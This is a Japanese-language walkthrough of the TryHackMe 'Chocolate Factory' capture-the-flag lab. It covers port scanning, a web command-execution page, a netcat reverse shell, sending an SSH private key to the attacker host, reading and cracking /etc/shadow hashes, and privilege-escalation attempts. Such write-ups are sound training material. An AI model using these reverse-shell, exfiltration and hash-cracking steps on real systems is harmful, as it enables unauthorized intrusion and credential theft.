# Chocolate Factory CTF

https://tryhackme.com/room/chocolatefactory

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.30.136
root@ip-10-10-96-59:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-06 06:24 GMT
Nmap scan report for 10.10.30.136
Host is up (0.053s latency).
Not shown: 65506 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
100/tcp open  newacct
101/tcp open  hostname
102/tcp open  iso-tsap
103/tcp open  gppitnp
104/tcp open  acr-nema
105/tcp open  csnet-ns
106/tcp open  pop3pw
107/tcp open  rtelnet
108/tcp open  snagas
109/tcp open  pop2
110/tcp open  pop3
111/tcp open  rpcbind
112/tcp open  mcidas
113/tcp open  ident
114/tcp open  audionews
115/tcp open  sftp
116/tcp open  ansanotify
117/tcp open  uucp-path
118/tcp open  sqlserv
119/tcp open  nntp
120/tcp open  cfdptkt
121/tcp open  erpc
122/tcp open  smakynet
123/tcp open  ntp
124/tcp open  ansatrader
125/tcp open  locus-map
MAC Address: 02:77:2E:8A:52:89 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 12.04 seconds

sudo nmap -sV -p80 $TARGET
```

### gobuster

```shell
root@ip-10-10-96-59:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.30.136
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/home.php             (Status: 200) [Size: 569]
/validate.php         (Status: 200) [Size: 93]
/server-status        (Status: 403) [Size: 277]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

## /home.php

システムコマンドを実行できるようになっている。

ls -al

```text
total 1152
drwxr-xr-x 2 root root 4096 Oct 6 2020 .
drwxr-xr-x 3 root root 4096 Sep 29 2020 ..
-rw------- 1 root root 12288 Oct 1 2020 .swp
-rw-rw-r-- 1 charlie charley 65719 Sep 30 2020 home.jpg
-rw-rw-r-- 1 charlie charley 695 Sep 30 2020 home.php
-rw-rw-r-- 1 charlie charley 1060347 Sep 30 2020 image.png
-rw-rw-r-- 1 charlie charley 1466 Oct 1 2020 index.html
-rw-rw-r-- 1 charlie charley 273 Sep 29 2020 index.php.bak
-rw-r--r-- 1 charlie charley 8496 Sep 30 2020 key_rev_key
-rw-rw-r-- 1 charlie charley 303 Sep 30 2020 validate.php
```

file key_rev_key

```text
key_rev_key: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8273c8c59735121c0a12747aee7ecac1aabaf1f0, not stripped
```

key_rev_key は実行ファイルだが、key_rev_key を実行しても出力は無かった。

strings key_rev_key

```text

/lib64/ld-linux-x86-64.so.2 libc.so.6 __isoc99_scanf puts __stack_chk_fail printf __cxa_finalize strcmp __libc_start_main GLIBC_2.7 GLIBC_2.4 GLIBC_2.2.5 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable 5j %l %j %b %Z %R %J %b =9 AWAVI AUATL []A\A]A^A_ Enter your name: laksdhfas congratulations you have found the key: b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=' Keep its safe Bad name! ;*3$" GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0 crtstuff.c deregister_tm_clones __do_global_dtors_aux completed.7698 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry license.c __FRAME_END__ __init_array_end _DYNAMIC __init_array_start __GNU_EH_FRAME_HDR _GLOBAL_OFFSET_TABLE_ __libc_csu_fini _ITM_deregisterTMCloneTable puts@@GLIBC_2.2.5 _edata __stack_chk_fail@@GLIBC_2.4 printf@@GLIBC_2.2.5 __libc_start_main@@GLIBC_2.2.5 __data_start strcmp@@GLIBC_2.2.5 __gmon_start__ __dso_handle _IO_stdin_used __libc_csu_init __bss_start main __isoc99_scanf@@GLIBC_2.7 __TMC_END__ _ITM_registerTMCloneTable __cxa_finalize@@GLIBC_2.2.5 .symtab .strtab .shstrtab .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .dynamic .data .bss .comment
```

cat validate.php | base64 （で取得後にデコードしたソースコード）

```php
<?php
        $uname=$_POST['uname'];
        $password=$_POST['password'];
        if($uname=="charlie" && $password=="cn7824"){
                echo "<script>window.location='home.php'</script>";
        }
        else{
                echo "<script>alert('Incorrect Credentials');</script>";
                echo "<script>window.location='index.html'</script>";
        }
?>
```

cat index.php.bak | base64

```php
<html>
<body>
<form method="POST">
    <input id="comm" type="text" name="command" placeholder="Command">
    <button>Execute</button>
</form>
<?php
    if(isset($_POST['command']))
    {
        $cmd = $_POST['command'];
        echo shell_exec($cmd);
    }
?>
```

## リバースシェル

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.22.182 8888 >/tmp/f
```

```shell
$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.30.136] 57434
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ls -al /home
total 12
drwxr-xr-x  3 root    root    4096 Oct  1  2020 .
drwxr-xr-x 24 root    root    4096 Sep  1  2020 ..
drwxr-xr-x  5 charlie charley 4096 Oct  7  2020 charlie
$ ls -al /home/charlie
total 40
drwxr-xr-x 5 charlie charley 4096 Oct  7  2020 .
drwxr-xr-x 3 root    root    4096 Oct  1  2020 ..
-rw-r--r-- 1 charlie charley 3771 Apr  4  2018 .bashrc
drwx------ 2 charlie charley 4096 Sep  1  2020 .cache
drwx------ 3 charlie charley 4096 Sep  1  2020 .gnupg
drwxrwxr-x 3 charlie charley 4096 Sep 29  2020 .local
-rw-r--r-- 1 charlie charley  807 Apr  4  2018 .profile
-rw-r--r-- 1 charlie charley 1675 Oct  6  2020 teleport
-rw-r--r-- 1 charlie charley  407 Oct  6  2020 teleport.pub
-rw-r----- 1 charlie charley   39 Oct  6  2020 user.txt
```

charley になる必要がある。

PEM RSA 秘密鍵をダウンロード

```shell
$ file ./teleport
./teleport: PEM RSA private key
$ nc 10.2.22.182 6666 < ./teleport

$ nc -lvnp 6666 > ./prikey
```

秘密鍵を使って、charlie として SSH 接続できた。

```shell
$ chmod 600 ./prikey
$ ssh charlie@10.10.30.136 -i ./prikey
```

```shell
charlie@chocolate-factory:/home/charlie$ cat user.txt
flag{cd........................}
```

ユーザーフラグゲット

## 権限昇格

```shell
charlie@chocolate-factory:/home/charlie$ sudo -l
Matching Defaults entries for charlie on chocolate-factory:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```

root ユーザー以外で vi を起動できるパターン。

### sudo -u#-1

```shell
charlie@chocolate-factory:/home/charlie$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

sudo 1.8.28 より古い。

```shell
charlie@chocolate-factory:/home/charlie$ sudo -u#-1 /usr/bin/vi -c ':!/bin/sh' /dev/null
sudo: unknown user: #-1
sudo: unable to initialize policy plugin
```

-u#-1 のパターンで行けるかと思ったが機能しなかった。

```shell
charlie@chocolate-factory:/home/charlie$ id
uid=1000(charlie) gid=1000(charley) groups=1000(charley),0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

lxd グループに入っている。

### lxd 権限昇格

```shell
# kali
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine

python -m http.server
```

```shell
charlie@chocolate-factory:/home/charlie$ cd /tmp
charlie@chocolate-factory:/tmp$ wget http://10.2.22.182:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz

charlie@chocolate-factory:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
Error: mkdir /home/charley: permission denied
```

不明なエラーで中断。

### shadow

sudo vi /etc/shadow で shadow を開く。

```shell
root:$6$.hWj2crD$ch//0HP/gRcEpyW10XktEpu0bDYU51MZaUuzHpb..Han2SFSiNEZgc1/utcnlKbyyhUKb768ouSAd8ITNlWlb/:18534:0:99999:7:::
daemon:*:18480:0:99999:7:::
bin:*:18480:0:99999:7:::
sys:*:18480:0:99999:7:::
sync:*:18480:0:99999:7:::
games:*:18480:0:99999:7:::
man:*:18480:0:99999:7:::
lp:*:18480:0:99999:7:::
mail:*:18480:0:99999:7:::
news:*:18480:0:99999:7:::
uucp:*:18480:0:99999:7:::
proxy:*:18480:0:99999:7:::
www-data:*:18480:0:99999:7:::
backup:*:18480:0:99999:7:::
list:*:18480:0:99999:7:::
irc:*:18480:0:99999:7:::
gnats:*:18480:0:99999:7:::
nobody:*:18480:0:99999:7:::
systemd-network:*:18480:0:99999:7:::
systemd-resolve:*:18480:0:99999:7:::
syslog:*:18480:0:99999:7:::
messagebus:*:18480:0:99999:7:::
_apt:*:18480:0:99999:7:::
lxd:*:18480:0:99999:7:::
uuidd:*:18480:0:99999:7:::
dnsmasq:*:18480:0:99999:7:::
landscape:*:18480:0:99999:7:::
pollinate:*:18480:0:99999:7:::
sshd:*:18506:0:99999:7:::
ftp:*:18506:0:99999:7:::
charlie:$6$J1Cmev6V$ifUMOM0VViXR0/8BKz7FLIG8mkT5i1QHdzAXV6A.9l8g51baubW6QK4CHKuKzRGL75cmc/W6hv3VNUSOukcmM1:18534:0:99999:7:::
```

rockyou.txt でパスワードクラック

```shell
hashcat -m 1800 hash.txt rockyou.txt

$6$.hWj2crD$ch//0HP/gRcEpyW10XktEpu0bDYU51MZaUuzHpb..Han2SFSiNEZgc1/utcnlKbyyhUKb768ouSAd8ITNlWlb/:（ひみつ）

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$.hWj2crD$ch//0HP/gRcEpyW10XktEpu0bDYU51MZaUuzHpb...NlWlb/
Time.Started.....: Thu Mar 06 16:08:33 2025 (2 secs)
Time.Estimated...: Thu Mar 06 16:08:35 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
```

あっさり割れた。

```shell
charlie@chocolate-factory:/tmp$ su -
Password:
root@chocolate-factory:~# whoami
root
```

謎の Python スクリプトが入っている。ちなみに Charlie オーナー。

```shell
root@chocolate-factory:~# ls /root
root.py

root@chocolate-factory:~# python /root/root.py
Enter the key:  ^CTraceback (most recent call last):
  File "/root/root.py", line 3, in <module>
    key=input("Enter the key:  ")
KeyboardInterrupt

root@chocolate-factory:~# cat /root/root.py
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
```

序盤で入手した鍵  
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='  
を使ったらクリアできた。

```shell
root@chocolate-factory:~# python ./root.py
Enter the key:  b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
__   __               _               _   _                 _____ _
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|

  ___                              ___   __
 / _ \__      ___ __   ___ _ __   / _ \ / _|
| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_
| |_| |\ V  V /| | | |  __/ |    | |_| |  _|
 \___/  \_/\_/ |_| |_|\___|_|     \___/|_|


  ____ _                     _       _
 / ___| |__   ___   ___ ___ | | __ _| |_ ___
| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
| |___| | | | (_) | (_| (_) | | (_| | ||  __/
 \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|

 _____          _
|  ___|_ _  ___| |_ ___  _ __ _   _
| |_ / _` |/ __| __/ _ \| '__| | | |
|  _| (_| | (__| || (_) | |  | |_| |
|_|  \__,_|\___|\__\___/|_|   \__, |
                              |___/

flag{ce.....................}
```

ルートフラグゲット！

## 振り返り

- いろんな攻撃の道筋がありそう。
- 未確認だが、たぶん charlie ユーザーのままでも最後のスクリプトを実行できたのでは？
